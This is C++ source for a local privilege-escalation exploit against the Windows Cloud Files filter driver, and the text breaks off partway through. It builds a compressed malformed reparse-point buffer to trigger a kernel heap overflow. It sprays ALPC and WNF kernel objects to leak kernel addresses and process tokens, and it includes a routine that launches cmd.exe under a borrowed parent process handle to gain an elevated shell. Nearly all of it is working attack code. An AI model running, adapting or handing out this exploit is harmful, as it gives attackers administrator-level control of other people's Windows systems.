#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <atlstr.h>
#include <cfapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include "poc.h"
using namespace std;

#pragma comment(lib, "CldApi.lib") 
#pragma comment(lib,"kernel32.lib")

CString SyncRoot = L"c:\\windows\\temp\\";

// Function resolving stuff
fpRtlDecompressBuffer RtlDecompressBuffer;
fpRtlCompressBuffer RtlCompressBuffer;
fpRtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize;
fpNtFsControlFile NtFsControlFile;
fpNtCreateWnfStateName NtCreateWnfStateName;
fpNtUpdateWnfStateData NtUpdateWnfStateData;
fpNtQueryWnfStateData NtQueryWnfStateData;
fpNtDeleteWnfStateData NtDeleteWnfStateData;
fpNtDeleteWnfStateName NtDeleteWnfStateName;
fpNtAlpcCreatePort NtAlpcCreatePort; 
fpNtAlpcCreateResourceReserve NtAlpcCreateResourceReserve; 
fpNtAlpcSendWaitReceivePort NtAlpcSendWaitReceivePort;

// Resolve function addresses
int ResolveFunctions(void) {
    // Get module handle of ntdll
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");    
    if (!ntdll) {
        printf("[!] GetModuleHandle failed\n");
        return -1;
    }

    // Get function addresses
    RtlDecompressBuffer = (fpRtlDecompressBuffer) GetProcAddress(ntdll,"RtlDecompressBuffer");
    RtlCompressBuffer = (fpRtlCompressBuffer) GetProcAddress(ntdll, "RtlCompressBuffer");
    RtlGetCompressionWorkSpaceSize = (fpRtlGetCompressionWorkSpaceSize) GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
    NtFsControlFile = (fpNtFsControlFile) GetProcAddress(ntdll, "NtFsControlFile");
    NtCreateWnfStateName = (fpNtCreateWnfStateName) GetProcAddress(ntdll, "NtCreateWnfStateName");
    NtUpdateWnfStateData = (fpNtUpdateWnfStateData) GetProcAddress(ntdll, "NtUpdateWnfStateData");
    NtQueryWnfStateData = (fpNtQueryWnfStateData) GetProcAddress(ntdll, "NtQueryWnfStateData");
    NtDeleteWnfStateData = (fpNtDeleteWnfStateData) GetProcAddress(ntdll, "NtDeleteWnfStateData");
    NtDeleteWnfStateName = (fpNtDeleteWnfStateName) GetProcAddress(ntdll, "NtDeleteWnfStateName");
    NtAlpcCreatePort = (fpNtAlpcCreatePort) GetProcAddress(ntdll, "NtAlpcCreatePort");
    NtAlpcCreateResourceReserve = (fpNtAlpcCreateResourceReserve) GetProcAddress(ntdll, "NtAlpcCreateResourceReserve"); 
    NtAlpcSendWaitReceivePort = (fpNtAlpcSendWaitReceivePort) GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");

    if (!RtlDecompressBuffer || 
        !RtlCompressBuffer || 
        !RtlGetCompressionWorkSpaceSize || 
        !NtFsControlFile || 
        !NtCreateWnfStateName ||
        !NtUpdateWnfStateData ||
        !NtQueryWnfStateData ||
        !NtDeleteWnfStateData ||
        !NtDeleteWnfStateName ||
        !NtAlpcCreatePort ||
        !NtAlpcCreateResourceReserve ||
        !NtAlpcSendWaitReceivePort) {
        printf("[!] GetProcAddress failed\n");
        return -1;
    }

    printf("[+] Function addresses resolved\n");
    return 0;
}

// CRC32 STUFF
/* CRC polynomial 0xedb88320 */
// https://github.com/sherpya/nloader/blob/master/libs/ntdll/crc32.c
static const DWORD CRC_table[256] =
{
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

DWORD RtlComputeCrc32(DWORD dwInitial, char * pData, INT iLen)
{
    DWORD crc = ~dwInitial;
    while (iLen > 0)
    {
        crc = CRC_table[(crc ^ *pData) & 0xff] ^ (crc >> 8);
        pData++;
        iLen--;
    }
    return ~crc;
}

// GENERAL STUFF
SIZE_T StringLengthW(_In_ LPCWSTR String) {
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

VOID RtlInitUnicodeString(_Inout_ PUNICODE_STRING DestinationString, _In_ PCWSTR SourceString) {
	SIZE_T DestSize;

	if (SourceString) {
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else {
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// RPBUF STUFF
struct RpBufConstructElementInfo { // Used for constructing the RpBuf object
    int ElemType;
    int ElemLength;
    int ElemOffset;
};

struct RpBufConstructHeader {
    int ElementCount;
    RpBufConstructElementInfo* ElementInfoHeader[0x10]; // Array of pointers containing element headers
    char* ElementInfoData[0x10]; // Array of pointers containing element info data
};

struct REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    char   RpBuf[0x2000]; 
};

struct REPARSE_DATA_BUFFER_EX {
    ULONG     Flags;
    ULONG     ExistingReparseTag;
    GUID      ExistingReparseGuid;
    ULONGLONG Reserved;
    REPARSE_DATA_BUFFER ReparseDataBuffer;
};

// FeRpBufConstruct with no compression
// Start from XXXXFeRp
unsigned short FeRpBufConstruct(RpBufConstructHeader * info, char * output, short MaxElem) {
    char* ptr;

    // Construct the header and write the data
    ptr = output + 0x14;
    int count = info->ElementCount;
    for (int i = 0; i < count; i++) {
        // Write the information into the header
        *(short*)ptr = info->ElementInfoHeader[i]->ElemType;
        *((short*)(ptr + 0x2)) = info->ElementInfoHeader[i]->ElemLength;
        *((int*)(ptr + 0x4)) = info->ElementInfoHeader[i]->ElemOffset;
        // Write the element information into the buffer
        memcpy((char*)(output + info->ElementInfoHeader[i]->ElemOffset), info->ElementInfoData[i], info->ElementInfoHeader[i]->ElemLength);
        // Increment ptr
        ptr = ptr + 0x8;

    }

    // Add some required stuff
    *((short*)output) = 0x1;
    *((short*)(output + 0x10)) = 0x2; // CRC32 exists
    *((short*)(output + 0x12)) = MaxElem;

    // Add the FeRp magic
    *((int*)(output + 0x4)) = 0x70526546; // FeRp

    // Calculate the length of the entire object (including the front bits)
    // maximal is the size of the ENTIRE OBJECT
    unsigned short maximal = 0;
    for (int i = 0; i < count; i++) {
        if ((info->ElementInfoHeader[i]->ElemLength + info->ElementInfoHeader[i]->ElemOffset) > maximal) {
            maximal = info->ElementInfoHeader[i]->ElemLength + info->ElementInfoHeader[i]->ElemOffset;
        }
    }
    // Align maximal to 8 bytes
    maximal = maximal + (8 - (maximal % 8));

    // Put in the total data size (the one right after CRC32)
    *((unsigned int*)(output + 0xc)) = maximal - 4; 

    // Add in the extra stuff 
    *((short*)(output + 0x5c)) = 0xa;
    *((short*)(output + 0x5e)) = 0x4;

    // Calculate the CRC32
    unsigned int CRC32Value = 0x0;
    CRC32Value = RtlComputeCrc32(0, (output + 12), (maximal - 8 - 4));
    *((unsigned int *)(output + 0x8)) = CRC32Value;

    // Add in the struct size
    *((short*)(output + 0x2)) = maximal;

    return maximal;
}

// FeRpBufConstruct with compression
// input would be the buffer generated by FeRpBufConstruct
unsigned short FeRpBufCompress(char * input, unsigned short inputSize, char * output) {
    unsigned short size = 0; 
    char * out_ptr = 0; 
    char * in_ptr = 0;
    LPVOID workspace = 0;
    char ResultBuf[0x1000];
    memset(ResultBuf, 0x0, sizeof(ResultBuf));

    // Set compression flag (i.e. | 0x8000)
    *((short *)(output)) = 0x8001; // Compression flag

    // Determine workspace size LZNT1
    unsigned long BufferWorkSpaceSize = 0; 
    unsigned long FragmentWorkSpaceSize = 0;
    RtlGetCompressionWorkSpaceSize(2, &BufferWorkSpaceSize, &FragmentWorkSpaceSize); 
    
    // Allocate WorkSpace by HeapAlloc
    HANDLE hHeap; 
    hHeap = GetProcessHeap();
    workspace = HeapAlloc(hHeap, 0x0, BufferWorkSpaceSize); 

    // Do compression  
    out_ptr = output + 0x4;
    in_ptr = input + 0x4; 
    RtlCompressBuffer(2, (PUCHAR)in_ptr, (inputSize-4), (PUCHAR)ResultBuf, sizeof(ResultBuf), 4096, (PULONG)&size, workspace);
    memcpy(out_ptr, ResultBuf, size);

    // Fill in the size
    *((unsigned short *)(output + 0x2)) = (inputSize);

    return (size+4);
}

// BITMAP CONSTRUCTION STUFF
unsigned short BtRpBufConstruct(RpBufConstructHeader * info, char * output) {
    char * ptr; 

    // Set BtRp Magic value
    *((unsigned int *)(output+4)) = 0x70527442; 

    // Set the number of elements -- must be 0x5 for BtRp
    *((short *)(output + 18)) = 0x5;

    // Construct the header and write the data
    ptr = output + 0x14; 
    for (int i = 0; i < info->ElementCount; i++) {
        // Write the information into the header
        *(short*)ptr = info->ElementInfoHeader[i]->ElemType;
        *((short*)(ptr + 0x2)) = info->ElementInfoHeader[i]->ElemLength;
        *((int*)(ptr + 0x4)) = info->ElementInfoHeader[i]->ElemOffset;
        // Write the data into the buffer
        memcpy((char*)(output + info->ElementInfoHeader[i]->ElemOffset + 4), info->ElementInfoData[i], info->ElementInfoHeader[i]->ElemLength);
        // Increment ptr
        ptr = ptr + 0x8;
    }

    // Calculate the length of the entire object (including the front bits)
    unsigned short maximal = 0;
    for (int i = 0; i < info->ElementCount; i++) {
        if ((info->ElementInfoHeader[i]->ElemLength + info->ElementInfoHeader[i]->ElemOffset) > maximal) {
            maximal = info->ElementInfoHeader[i]->ElemLength + info->ElementInfoHeader[i]->ElemOffset;
        }
    }

    // Set the size 
    *((unsigned short *)(output + 12)) = maximal + 4; 

    // Set the CRC32 flag
    *((short *)(output + 0x10)) = 0x2;

    // Calculate CRC32
    unsigned int CRC32Value = 0x0;
    CRC32Value = RtlComputeCrc32(0, (output + 0xc), (maximal + 4 - 8));
    *((unsigned int *)(output + 0x8)) = CRC32Value;

    return (maximal+4); 
}

// ALPC Spray stuff
CONST WCHAR g_wszPortPrefix[] = L"MyPort";
HANDLE g_hResource = NULL;

BOOL CreateALPCPorts(HANDLE* phPorts, UINT portsCount) {
	ALPC_PORT_ATTRIBUTES serverPortAttr;
	OBJECT_ATTRIBUTES    oaPort;
	HANDLE               hPort;
	NTSTATUS             ntRet;
	UNICODE_STRING       usPortName;
	WCHAR				 wszPortName[64];

	for (UINT i = 0; i < portsCount; i++) {
		swprintf_s(wszPortName, sizeof(wszPortName) / sizeof(WCHAR), L"\\RPC Control\\%s%d", g_wszPortPrefix, i);
		RtlInitUnicodeString(&usPortName, wszPortName);
		InitializeObjectAttributes(&oaPort, &usPortName, 0, 0, 0);
		RtlSecureZeroMemory(&serverPortAttr, sizeof(serverPortAttr));
		serverPortAttr.MaxMessageLength = MAX_MSG_LEN;
		ntRet = NtAlpcCreatePort(&phPorts[i], &oaPort, &serverPortAttr);
		if (!SUCCEEDED(ntRet))
			return FALSE;
	}
	return TRUE;
}

BOOL AllocateALPCReserveHandles(HANDLE* phPorts, UINT portsCount, UINT reservesCount) {
	HANDLE hPort;
	HANDLE hResource;
	NTSTATUS ntRet;

	for (UINT i = 0; i < portsCount; i++) {
		hPort = phPorts[i];
		for (UINT j = 0; j < reservesCount; j++) {
			ntRet = NtAlpcCreateResourceReserve(hPort, 0, 0x28, &hResource);
			if (!SUCCEEDED(ntRet))
				return FALSE;
			if (g_hResource == NULL) {	
				g_hResource = hResource;
			}
		}
	}
	return TRUE;
}

// Hexdump for debug
void DumpHex(const char* data, unsigned long long size) {
    char ascii[17];
    unsigned long long i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

// EXPLOIT FUNCTIONS
// BuildOverflow: Sets the reparse point information of a file
int BuildOverflow(HANDLE hFile, int PayloadSize, char * PayloadBuf) {
    // CONSTRUCT REPARSE BUFFER PAYLOAD
    // Construct BtRp
    struct RpBufConstructElementInfo Bt0, Bt1, Bt2, Bt3, Bt4; 
    struct RpBufConstructHeader BtHeader;
    char BtBuf[0x4000];
    memset(BtBuf, 0x0, sizeof(BtBuf));

    printf("[+] Building payload\n");

    // Initialize header information
    Bt0.ElemType = 0x7; 
    Bt0.ElemLength = 0x1; 
    Bt0.ElemOffset = 0x60; 
    Bt1.ElemType = 0x7; 
    Bt1.ElemLength = 0x1; 
    Bt1.ElemOffset = 0x64; 
    Bt2.ElemType = 0x7; 
    Bt2.ElemLength = 0x1; 
    Bt2.ElemOffset = 0x68; 
    Bt3.ElemType = 0x6; 
    Bt3.ElemLength = 0x8; 
    Bt3.ElemOffset = 0x6c; 
    Bt4.ElemType = 0x11; 
    Bt4.ElemOffset = 0x78;
    Bt4.ElemLength = PayloadSize; // Size of buffer that causes heap overflow

    // Construct BtRp Header
    BtHeader.ElementCount = 5; 
    BtHeader.ElementInfoHeader[0] = &Bt0; 
    BtHeader.ElementInfoHeader[1] = &Bt1;
    BtHeader.ElementInfoHeader[2] = &Bt2;
    BtHeader.ElementInfoHeader[3] = &Bt3;
    BtHeader.ElementInfoHeader[4] = &Bt4;

    char Bt0Buf[0x100]; 
    char Bt1Buf[0x100];
    char Bt2Buf[0x100];
    char Bt3Buf[0x100];

    memset(Bt0Buf, 0x0, sizeof(Bt0Buf));
    memset(Bt0Buf, 0x1, 1);
    memset(Bt1Buf, 0x0, sizeof(Bt1Buf)); 
    memset(Bt1Buf, 0x10, 1); 
    memset(Bt2Buf, 0x0, sizeof(Bt2Buf)); 
    memset(Bt3Buf, 0x0, sizeof(Bt3Buf)); 

    BtHeader.ElementInfoData[0] = Bt0Buf;
    BtHeader.ElementInfoData[1] = Bt1Buf;
    BtHeader.ElementInfoData[2] = Bt2Buf;
    BtHeader.ElementInfoData[3] = Bt3Buf;
    BtHeader.ElementInfoData[4] = PayloadBuf;

    // Construct BtBuf
    unsigned short BtSize; 
    BtSize = BtRpBufConstruct(&BtHeader, BtBuf); 
    printf("[+] BtSize: 0x%lx\n", BtSize);

    // Construct FeRp
    struct RpBufConstructElementInfo Data0, Data1, Data2, Data3, Data4;
    struct RpBufConstructHeader DataHeader;
    char RpBuf[0x4000];
    memset(RpBuf, 0x0, sizeof(RpBuf));

    // Initialize header information
    Data0.ElemType = 0x7;
    Data0.ElemLength = 0x1;
    Data0.ElemOffset = 0x60;
    Data1.ElemType = 0xa;
    Data1.ElemLength = 0x4;
    Data1.ElemOffset = 0x64;
    Data2.ElemType = 0x6;
    Data2.ElemLength = 0x8;
    Data2.ElemOffset = 0x6c;
    Data3.ElemType = 0x11;
    Data3.ElemLength = 0x4;
    Data3.ElemOffset = 0x68;
    
    // Trigger Bitmap object
    Data4.ElemType = 0x11; 
    Data4.ElemLength = BtSize; 
    Data4.ElemOffset = 0x78;

    // Construct RpBufConstructHeader
    DataHeader.ElementCount = 5;
    DataHeader.ElementInfoHeader[0] = &Data0;
    DataHeader.ElementInfoHeader[1] = &Data1;
    DataHeader.ElementInfoHeader[2] = &Data2;
    DataHeader.ElementInfoHeader[3] = &Data3;
    DataHeader.ElementInfoHeader[4] = &Data4;

    char Data0Buf[0x100];
    char Data1Buf[0x100];
    char Data2Buf[0x100];
    char Data3Buf[0x100];

    memset(Data0Buf, 0x0, sizeof(Data0Buf));
    memset(Data0Buf, 0x74, 1);
    memset(Data1Buf, 0x0, sizeof(Data1Buf));
    memset(Data1Buf, 0x1, 1);
    memset(Data2Buf, 0x0, sizeof(Data2Buf));
    memset(Data2Buf, 0x41, 4);
    memset(Data3Buf, 0x0, sizeof(Data3Buf));
    memset(Data3Buf, 0x40, 1);

    DataHeader.ElementInfoData[0] = Data0Buf;
    DataHeader.ElementInfoData[1] = Data1Buf;
    DataHeader.ElementInfoData[2] = Data2Buf;
    DataHeader.ElementInfoData[3] = Data3Buf;

    // Trigger Bitmap Data
    DataHeader.ElementInfoData[4] = BtBuf; 

    // Construct RpBuf
    unsigned short RpBufSize = 0; 
    RpBufSize = FeRpBufConstruct(&DataHeader, RpBuf, 0xa);
    printf("[+] RpBufSize: 0x%lx\n", RpBufSize); 

    // Compress RpBuf
    char CompressedRpBuf[0x1000];
    unsigned long CompressedRpBufSize = 0;
    memset(CompressedRpBuf, 0x0, sizeof(CompressedRpBuf));
    CompressedRpBufSize = FeRpBufCompress(RpBuf, RpBufSize, CompressedRpBuf);
    printf("[+] Compressed RpBuf size: 0x%lx\n", CompressedRpBufSize);

    // Prepare information for REPARSE_DATA_BUFFER_EX
    // REPARSE_DATA_BUFFER_EX header length is 0x28
    BOOL hBool; 
    DWORD returned;
    REPARSE_DATA_BUFFER_EX RpBufEx = {0}; 
    RpBufEx.Flags = 0x1; // needs to be 0x1
    RpBufEx.ExistingReparseTag = 0x9000601a; 
    memset(&RpBufEx.ExistingReparseGuid, 0x0, 16);
    RpBufEx.Reserved = 0x0; 
    RpBufEx.ReparseDataBuffer.ReparseTag = 0x9000601a;
    RpBufEx.ReparseDataBuffer.ReparseDataLength = CompressedRpBufSize;
    RpBufEx.ReparseDataBuffer.Reserved = 0x0;

    memcpy(&RpBufEx.ReparseDataBuffer.RpBuf, CompressedRpBuf, CompressedRpBufSize); 

    // Set reparse point information
    hBool = DeviceIoControl(hFile, FSCTL_SET_REPARSE_POINT_EX, &RpBufEx, (0x28+CompressedRpBufSize), NULL, 0, NULL, NULL);
    if (hBool == 0) {
        cout << "FSCTL_SET_REPARSE_POINT_EX failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] FSCTL_SET_REPARSE_POINT_EX succeeded\n");

    return 0;
}

// PWNY STUFF
void CreateProcessFromHandle(HANDLE hProcess) {

    int error;
    bool status;
    SIZE_T size = 0;
    LPVOID lpValue = nullptr;
    STARTUPINFOEX si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = nullptr;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize the thread attribute list
    do
    {
        status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        error = GetLastError();

        if (!status)
        {
            if (si.lpAttributeList != nullptr)
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
            ZeroMemory(si.lpAttributeList, size);
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Update the thread attribute with the parent process handle
    do
    {
        if (!status)
        {
            std::cout << "[-] Failed to initialize thread attribute list.\n";
            std::cout << "    |-> " << error << "\n";
            break;
        }

        lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
        memcpy_s(lpValue, sizeof(HANDLE), &hProcess, sizeof(HANDLE));

        status = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValue,
            sizeof(HANDLE),
            nullptr,
            nullptr);

        if (!status)
        {
            error = GetLastError();
            std::cout << "[-] Failed to update thread attribute.\n";
            std::cout << "    |-> " << error << "\n";
            break;
        }

        // Create a new process using the specified command line
        status = CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, nullptr, nullptr, &si.StartupInfo, &pi);

        if (!status)
        {
            error = GetLastError();
            std::cout << "[-] Failed to create new process.\n";
            std::cout << "    |-> " << error << "\n";
        }
        else
        {
            std::cout << "[+] New process is created successfully.\n";
            std::cout << "    |-> PID : " << pi.dwProcessId << "\n";
            std::cout << "    |-> TID : " << pi.dwThreadId << "\n";
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (false);

    // Clean up allocated memory
    if (lpValue != nullptr)
        HeapFree(GetProcessHeap(), 0, lpValue);

    if (si.lpAttributeList != nullptr)
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return;
}

// Leak variables
unsigned long long ALPC_leak = 0;
unsigned long long pipe_leak = 0;
unsigned long long ALPC_port_leak = 0; 
unsigned long long ALPC_message_leak = 0; 
unsigned long long ALPC_handle_table = 0; 
unsigned long long EPROCESS_leak = 0; 
unsigned long long token_leak = 0; 

int main(void) {

    // STAGE 0: SETUP
    printf("STAGE 0: SETUP\n");

    // Resolve functions
    ResolveFunctions();

    // cldflt stuff
    ifstream fs;
    ofstream fsTarget;
    DWORD SourceFileSize = 0;
    CF_CONNECTION_KEY key = { 0 };
    HRESULT hRet = S_OK;
    HANDLE hFile;
    BOOL bRet;
    int ret = 0;

    CF_SYNC_REGISTRATION CfSyncRegistration = { 0 };
    CfSyncRegistration.StructSize = sizeof(CF_SYNC_REGISTRATION);
    CfSyncRegistration.ProviderName = L"FFE4";
    CfSyncRegistration.ProviderVersion = L"1.0";
    CfSyncRegistration.ProviderId = { 0xf4d808a4, 0xa493, 0x4703, { 0xa8, 0xb8, 0xe2, 0x6a, 0x7, 0x7a, 0xd7, 0x3b } };

    CF_SYNC_POLICIES CfSyncPolicies = { 0 };
    CfSyncPolicies.StructSize = sizeof(CF_SYNC_POLICIES);
    CfSyncPolicies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    CfSyncPolicies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
    CfSyncPolicies.InSync = CF_INSYNC_POLICY_NONE;
    CfSyncPolicies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
    CfSyncPolicies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_UPDATE_UNRESTRICTED;

    hRet = CfRegisterSyncRoot(SyncRoot, &CfSyncRegistration, &CfSyncPolicies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet)) {
        CfUnregisterSyncRoot(SyncRoot);
        cout << "CfRegisterSyncRoot failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] CfRegisterSyncRoot success: 0x%lx\n", hRet);

    // Create exploit file 1 -- ChangeStamp 0xcafe
    HANDLE hFile1;
    CString FullFileName1 = L"c:\\windows\\temp\\test";
    hFile1 = CreateFile(FullFileName1, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {
        cout << "Open file failed! error=" << GetLastError() << endl;
        return -1;
    }
    printf("[+] Created exploit file 1: %d\n", hFile1);    

    // Change reparse point information of file
    char Bt4Buf[0x4000]; // Define Bt4Buf here 
    memset(Bt4Buf, 0x0, sizeof(Bt4Buf));
    memset(Bt4Buf, 0x51, 0x1000); 
    *(unsigned int *)(Bt4Buf + 0x1000) = 0x00100904; // Header
    *(unsigned int *)(Bt4Buf + 0x1004) = 0xff8; // AllocatedSize
    *(unsigned int *)(Bt4Buf + 0x1008) = 0xff8; // DataSize
    *(unsigned int *)(Bt4Buf + 0x100c) = 0xcafe; // ChangeStamp
    BuildOverflow(hFile1, 0x1010, Bt4Buf);

    printf("[+] Closing file 1\n");
    CloseHandle(hFile1);

    // STAGE 1: KERNEL LEAK
    printf("STAGE 1: KERNEL LEAK\n");

    // Spray _WNF_STATE_DATA
    #define NUM_WNDPADSPRAY 0x3000 
    #define NUM_WNFSTATEDATA 0x450 
    #define WNF_MAXBUFSIZE 0x1000 
    PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL;
    WNF_STATE_NAME PadStateNames[NUM_WNDPADSPRAY] = { 0 };
    WNF_STATE_NAME StateNames[NUM_WNFSTATEDATA] = { 0 };
    PSECURITY_DESCRIPTOR pSD = nullptr;
    NTSTATUS state = 0;
    char StateData[0x1000];

    printf("[+] Prepare _WNF_STATE_DATA spray\n");
    memset(StateData, 0x41, sizeof(StateData));

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"", SDDL_REVISION_1, &pSD, nullptr)) {
        cout << "ConvertStringSecurityDescriptorToSecurityDescriptor failed! error=" << GetLastError() << endl;
        return -1;
    }

    // Create state name objects
    for (int i = 0; i < NUM_WNDPADSPRAY; i++) {
        state = NtCreateWnfStateName(&PadStateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
        if (state != 0) {
            cout << "NtCreateWnfStateName failed! error=" << GetLastError() << endl;
            return -1;
        }
    }
    for (int i = 0; i < NUM_WNFSTATEDATA; i++) {
